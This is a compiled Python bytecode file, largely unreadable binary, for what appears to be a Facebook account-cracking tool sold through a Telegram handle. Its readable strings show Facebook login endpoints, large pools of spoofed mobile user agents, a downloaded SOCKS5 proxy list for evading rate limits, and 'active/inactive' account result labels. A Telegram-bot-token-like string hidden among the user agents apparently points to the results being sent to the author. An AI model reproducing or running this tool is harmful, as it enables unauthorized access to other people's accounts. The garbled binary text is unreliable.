�
    i�cHb �                   �F  � d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlT d�d�Z	 e	ddd�  �        Z
 ej        d�  �         e
rn ed�  �          ej        d�  �          ed	�  �         d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd d
lmZ d dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dl m!Z" d dlmZ# d dl$m%Z& d dl'm(Z) d dlmZ* d dlm+Z+ d dl,m-Z. dZ/dZ0dZ1 ej2        �   �         d         Z3e3Z4e4�5                    d�  �        Z6 ej7        e6�  �        Z8e8�9                    d�  �        Z:e:�;                    �   �         Z<e<�=                    dd�  �        �=                    dd�  �        �=                    dd�  �        �=                    d d!�  �        �=                    d"d#�  �        �=                    d$d%�  �        �=                    d&d'�  �        �=                    d(d)�  �        �=                    d*d+�  �        �=                    d,d$�  �        �=                    d-d+�  �        Z> e+j?        �   �           e�   �         Z@d.gZAd.gZBg d/�ZCg d0�ZDg d1�ZEg d1�ZFg g g g f\  ZGZHZIZJg d2d3gg g d g g d4d5d2d2g d6d2d2d2f\  ZKZLZMZNZOaPaQaRZSZTZUZVZWZXZYZZZ[g ZGg ZHg Z\ e j]        �   �         Z^g Z_	  e j`        d7�  �        ja        Zb ecd8d9�  �        �d                    eb�  �         n# ee$ rZf ed:�  �         Y dZf[fndZf[fww xY w ecd8d;�  �        �g                    �   �         �h                    �   �         Zb eid<�  �        D �]oZjd=Zk ejl        dd>�  �        Zm ejl        dd>�  �        Znd?Zo ejl        d@dA�  �        ZfdBZp ejl        dd>�  �        Zq ejl        ddC�  �        Zr ejl        ddC�  �        Zs ejl        ddC�  �        ZtdDZuek� em� dEen� dFeo� ef� ep� eq� dEer� dEes� dEet� dFeu� �ZveG�w                    ev�  �         dGZx ejy        g dH��  �        ZmdIZn ejy        g dJ��  �        Zo ejl        ddK�  �        Zf ejy        g dJ��  �        ZpdLZq ejl        dMd@�  �        ZrdNZs ejl        dOdP�  �        Zt ejl        dQdR�  �        ZudSZzex� dFem� dTen� eo� ef� ep� dUeq� er� dEes� dEet� dEeu� dFez� �Z{eH�w                    e{�  �         ��q eidV�  �        D ]�Z
dWZk ejl        d@dA�  �        Zm ejl        d@dA�  �        Zn ejy        g dJ��  �        Zo ejy        g dJ��  �        Zf ejy        g dJ��  �        Zp ejy        g dJ��  �        Zq ejl        dd>�  �        ZrdXZs ejl        dd>�  �        Zt ejl        dd>�  �        ZudYZzek� em� dZen� eo� ef� ep� eq� er� es� et� dEeu� dFez� �Z|��g d[�Z}d\� Zvg g d d d g g g g g g g g f\  ZOZ~aPaQaRZZ�ZVZ�Z�Z�Z�Z�g Z\g g cZ�Z�d]Z�d^Z�d_Z�d`Z�daZ�dbZ�dcZ�ddZ�deZ�dfZ�dgZ
d_Z�dhZud`ZrdiZ�djZ�dkZ�ddZmdlZ�dmdndodpdqdrdsdtdudvdwdxdy�Z�dmdndodpdqdrdsdtdudvdwdzd{�Z�ej        ��                    �   �         j�        Z�e� e�ej        ��                    �   �         j�        �  �                 Z�ej        ��                    �   �         j�        Z�d| e�e��  �        z   d}z    e�e��  �        z   d}z    e�e��  �        z   d~z   Z�d e�e��  �        z   d}z    e�e��  �        z   d}z    e�e��  �        z   d~z   Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�emd�z   erz   d�z   emz   d�z   Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�d�� Z�e�d�k    rT ej        d��  �         n#  Y nxY w ej�        d��  �         n#  Y nxY w ej�        d��  �         n#  Y nxY w e��   �          dS dS )��    N)�*c                 �  � t          j        �   �         }t          t          t	          | �  �        �  �        �  �        dk    r;|dk    r7|dk    r3|dk    r/|dk    r+|j        | k    r"|j        |k    r|j        |k     rdS d S d S d S d S d S d S d S d S )N�   �   r   �   T)�datetime�now�len�list�str�year�month�day)�y�m�d�dates       �aaa.py�stopedr      s�   � ��������S��V�V���������"�W�W��Q����2�g�g�!�a�%�%��y�A�~�~��
�a���	��A����d� ���W����g�%�%��~���	��    i�  �   �   zxdg-open  https://t.me/AM_2_5z;This tool hass ben expered tell me for bay vip toll @AM_2_5zTOLL WORKING @AM_2_5)�Table)�Console)�BeautifulSoup)�ThreadPoolExecutor)�Group)�Panel)�print)�Markdown)�Columns)�pretty)�Textzhttps://www.facebook.com/zhttps://business.facebook.comz�Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36�   �ascii�=�X�A�3�B�9�C�7�D�1�E�4�M�2�L�6�F�8�N�Ta�  Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36)��Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]�  NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0��Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]s�   �Jہ���G��.(��c�b���/����`л��&�0s�l�=C�aN�0;$�&Ǯq7U�[�gӈ�4��2�\�/N�@�/��(��;�+Mۚ���#[@���Z}��=���@����[��Q�;Ş2e`��~~��
�[�R��(?l�e$/K�0�IN%�x��Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405��Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;])r:   r;   z.5353538250:AAEy8dG0bzRX2mxgLoGJqWYcqk9fKok_Sjgr<   r=   r>   )��Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1��Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30��Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1��Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30z�Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16� l   �joIl �AKTIF�TIDAK�DOWNzHhttps://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txtz	.prox.txt�wu+   [[1;92m•[1;97m] [[1;96mThe Changcuters�ri'  z!Mozilla/5.0 (Symbian/3; Series60/�	   �Nokia�d   i'  zl/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/r   zMobile Safari/535.1�.� zMozilla/5.0 (Linux; U; Android)r5   r-   r7   r+   �10�11�12z en-us; GT-)r(   r*   r,   r.   r0   r6   �G�H�I�J�Kr4   r2   r8   �O�P�Q�R�Sr9   �U�V�Wr'   �Y�Zi�  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �0ih  i$  �(   �   zMobile Safari/537.36z; z) �
   z"Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-SzC; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/zMobile WVGA SMM-MMS/1.2.0 OPN-B�/(  r?   r@   rA   rB   a9  Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16 ,Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1r@   rA   rB   a.  Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16 ,Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36zzMozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36z�Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36u    Mozilla/5.0 (Linux; Android 1…z�[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36z~Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36zMozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J530GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A530F/A530FXXU4CSC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T835) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36��Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36rf   z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935F/G935FXXS2DRAA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G920K/KKS3ETJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-C9000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36rg   z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36rh   z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J720M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36zyMozilla/5.0 (Linux; Android 10; en-au; Pixel C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36zMozilla/5.0 (Linux; Android 10; en-au; NX659J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A102U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0; en-au; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-G550FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-N9200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; FRD-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P615) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F/N970FXXS6EUA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-F700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; CPH2009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G980F/G980FXXU3ATFG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G973F/G973FXXS3BSL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F/G960FXXSDFTL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A908N/KSU3CTL3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS6BUA5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXU3BRL8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36rl   rm   rn   ro   rp   z�Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-J320FN/J320FNXXU0ARE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36ri   rj   z�Mozilla/5.0 (Linux; Android 11 en-au;; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36rk   z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F/A515FXXU4DUB2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S111DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965N/KSU3FTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-F700U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXS3BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXS4BTG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-T827V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J260A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A307GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T585/T585XXS5CSH1) AppleWebKit/537.36 (KHTML, like 